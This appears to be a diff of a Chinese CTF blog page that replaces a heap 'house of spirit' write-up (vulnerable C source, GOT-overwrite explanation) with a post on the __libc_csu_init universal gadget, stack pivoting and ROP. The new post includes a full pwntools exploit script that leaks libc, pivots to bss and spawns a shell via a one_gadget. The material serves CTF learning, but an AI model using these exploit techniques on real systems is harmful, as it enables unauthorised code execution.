@@ -4,12 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="64位 house of spirit, 时钟">
-    <meta name="description" content="这个题目有问题，但是重要的是利用思想：可以把源码贴出来帮助理解：
-#include&amp;lt;stdio.h&amp;gt;
-#include&amp;lt;stdlib.h&amp;gt;
-#include&amp;lt;string.h&amp;gt;
-#include&amp;lt;u">
+    <meta name="keywords" content="linux 64位万能gadget &amp; 栈迁移 &amp; rop, 时钟">
+    <meta name="description" content="linux 64位万能gadget &amp;amp; 栈迁移 &amp;amp; rop用一个例题为例子，下面是它的关键函数：最后一个read函数存在溢出，但是由于溢出的长度有限因而不能够实现利用，同时第一个read函数可以向bss段读入超长数据，自然想">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>64位 house of spirit | 时钟</title>
+    <title>linux 64位万能gadget &amp; 栈迁移 &amp; rop | 时钟</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -243,13 +239,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        64位 house of spirit
+                        linux 64位万能gadget &amp; 栈迁移 &amp; rop
                     </div>
                 </div>
             </div>
@@ -384,21 +380,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-08-03
+                    2020-01-15
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        393
+                        551
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        2 分
                     </div>
                     
                 
@@ -414,62 +410,62 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>这个题目有问题，但是重要的是利用思想：可以把源码贴出来帮助理解：</p>
-<pre><code>#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
-#include&lt;string.h&gt;
-#include&lt;unistd.h&gt;
-char buf[128];  /*值得注意的是这几个全局变量在bss段是紧挨着排列的*/
-char *ptr[8];
-char *cmd;    //fake_chunk要把这个包含进去，这样的话就可以利用fgets实现任意地址写入
-int size;
-int n = 0;
-void sh(char *c)
-{
-    system(c);
-}
-int main()
-{
-    setvbuf(stdout,0,_IONBF,0);
-    memset(ptr,0,sizeof(ptr));
-    cmd = buf;
-    while(1)
-    {
-        fgets(cmd,sizeof(buf),stdin);
-        if(!strncmp(cmd,&quot;push&quot;,4))   //strncmp意思是只比较前4个
-        {
-            if(n&lt;8)
-            {
-                scanf(&quot;%d%*c&quot;,&amp;size);   //这里可以写入size 进而伪造next_chunk_size
-                ptr[n] = malloc(size);
-                fgets(ptr[n],size,stdin);
-                n++;
-            }
-            else
-            {
-                puts(&quot;stack is full&quot;);
-            }
-        }
-            else if(!strncmp(cmd,&quot;pop&quot;,3))
-            {
-                if(n&gt;=0)
-                {
-                    n--;
-                    puts(ptr[n]);
-                    free(ptr[n]);
-                    ptr[n] = 0;
-                }
-                else
-                {
-                    puts(&quot;stack is empty&quot;);
-                }
-            }
-            else{
-                puts(&quot;unkonwn command&quot;);
-            }
-        }
-    }
-</code></pre><p>file得知是64位动态链接程序，那么看看ida分析   （push指针共有8个，图里面写错了）<br><img src="/2019/08/03/64-wei-house-of-spirit/1.png" title="This is an image"><br>那么我们的第一步就是伪造chunk ，这一点需要注意的就是地址要16位对齐，否则free的时候无法绕过检查，我们可以把size写入为next_chunk_size来躲过检查，然后把伪造的chunk free掉，然后就是malloc写入把cmd给溢出指向fgets@got，然后fgets把strncmp@got给覆盖了（因为下一个执行的就是strncmp,然后fgets@got的最后2个byte地方可以放参数/bin/sh,其它的可以用00填充 ），下次调用就直接getshell</p>
+                <h1 id="linux-64位万能gadget-amp-栈迁移-amp-rop"><a href="#linux-64位万能gadget-amp-栈迁移-amp-rop" class="headerlink" title="linux 64位万能gadget &amp; 栈迁移 &amp; rop"></a>linux 64位万能gadget &amp; 栈迁移 &amp; rop</h1><p>用一个例题为例子，下面是它的关键函数：<br><img src="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/1.png" title="This is an image"><br>最后一个read函数存在溢出，但是由于溢出的长度有限因而不能够实现利用，同时第一个read函数可以向bss段读入超长数据，自然想到了栈迁移，但是我们看下保护。</p>
+<pre><code>[*] &#39;/home/root0/pratice/pwn/pwn50&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>NX开了，而且bss段没有可执行权限，那么我们不能向bss段读入shellcode，那么我们就可以利用rop技术，但是程序不大，所以用ROGgadget不能够找到合适的gadget段，但是，对于64位linux程序，只要调用了libc.so，那么就会有通用的gadget。</p>
+<h3 id="万能gadget-libc-csu-init"><a href="#万能gadget-libc-csu-init" class="headerlink" title="万能gadget :__libc_csu_init()"></a>万能gadget :<strong>__libc_csu_init()</strong></h3><img src="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/2.png" title="This is an image">
+<p>从0x40068A这里开始,rbx,rbp,r12,13,r14,r15，都会布置好，最后的哪个 。。。下面引用先知上一个大佬的文章，写的很详细。</p>
+<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>其实简单的说就是控制执行两次leave_ret ，栈里面把ebp/rbp的值改成目的址-8，就可以了,同时，可能比较疑惑的一点是bss段没有可执行权限，如果有权限的话就可以直接读入shellcode来实现getshell，由于没有权限的原因，我们只能采用rop的方式来进行控制，因为rop和bss段是否有执行权限无关。<br>这个题目的脚本可以用来了解一下，同时下面有个参考链接。</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># coding=utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn50'</span><span class="token punctuation">)</span>
+pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400693</span>
+leave_ret <span class="token operator">=</span> <span class="token number">0x00000000040060F</span>
+bss_addr <span class="token operator">=</span> <span class="token number">0x000000000601060</span>  <span class="token operator">+</span> <span class="token number">0x400</span>
+puts_ret_addr <span class="token operator">=</span> <span class="token number">0x601378</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn50"</span><span class="token punctuation">)</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_plt <span class="token operator">=</span> <span class="token number">0x0000000004004C0</span>
+main_addr <span class="token operator">=</span> <span class="token number">0x00000000040061D</span>
+rop <span class="token operator">=</span> <span class="token punctuation">[</span>
+    pop_rdi_ret<span class="token punctuation">,</span>
+    puts_got<span class="token punctuation">,</span>
+    puts_plt<span class="token punctuation">,</span>
+    main_addr<span class="token punctuation">,</span>
+<span class="token punctuation">]</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bss:\n'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">792</span> <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">232</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span>rop<span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"stack:\n"</span><span class="token punctuation">)</span>
+offset <span class="token operator">=</span> <span class="token number">10</span>
+payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> 
+<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00\x00"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
+libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
+one_gad_get <span class="token operator">=</span> <span class="token number">0x4526a</span> <span class="token operator">+</span> libcbase
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bss:\n"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"libcbase =====> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"system_addr =====> "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"stack:\n"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token number">-0x400</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gad_get<span class="token punctuation">)</span> 
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/5597" target="_blank" rel="noopener">https://xz.aliyun.com/t/5597</a>   万能gadget<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a>  栈迁移</p>
+</blockquote>
 
             </div>
             <hr>
@@ -501,9 +497,9 @@ int main()
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《64位 house of spirit》
+                    《linux 64位万能gadget &amp; 栈迁移 &amp; rop》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/03/64-wei-house-of-spirit/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/" property="cc:attributionName" rel="cc:attributionURL">
                 时钟
             </a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
@@ -544,42 +540,41 @@ int main()
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/08/16/chunk-extend-and-overlapping/">
+                <a href="/2020/01/15/linux-64-wei-wan-neng-gadget-zhan-qian-yi-rop/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Chunk Extend and Overlapping">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="linux 64位万能gadget & 栈迁移 & rop">
                         
-                        <span class="card-title">Chunk Extend and Overlapping</span>
+                        <span class="card-title">linux 64位万能gadget & 栈迁移 & rop</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            chunk extend 堆利用：    程序中堆的利用 可以控制chunk header中的数据 例如：heap overflowptmalloc 对chunk 操作的存在漏洞。
-首先：怎么获取chunk的大小？
-
-/* Get size
+                            linux 64位万能gadget &amp; 栈迁移 &amp; rop用一个例题为例子，下面是它的关键函数：最后一个read函数存在溢出，但是由于溢出的长度有限因而不能够实现利用，同时第一个read函数可以向bss段读入超长数据，自然想
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
-                                    漏洞利用
+                            <a href="/categories/CTF题解/" class="post-category" target="_blank">
+                                    CTF题解
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -598,36 +593,32 @@ int main()
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/08/03/stack-cookie-tan-suo/">
+                <a href="/2020/01/11/2019xman-ru-ying-sai/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="stack cookie探索">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="2019XMAN冬令营入营赛">
                         
-                        <span class="card-title">stack cookie探索</span>
+                        <span class="card-title">2019XMAN冬令营入营赛</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            stack cookie的两种讲法
-
-windows平台上叫 /GS:cookie
-linux上叫Stack Canary
-
-它的原理就是在ebp-4的地方插入一个随机数（4字节还是8字节看计算机位数了），然后在函数返回（return）的时
+                            2019XMAN入营赛XMAN训练营的题目，还是能学到不少东西的，就拿来看了看。
+babyarm这个题目并不难，难在于它是一个arm的架构，所以难以调试，不过从出题人哪里得到一个很好的github项目arm_now，但是我看了看还是没办法用
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-03
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-01-11
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/漏洞利用/" class="post-category" target="_blank">
-                                    漏洞利用
+                            <a href="/categories/CTF题解/" class="post-category" target="_blank">
+                                    CTF题解
                                 </a>
                             
                             
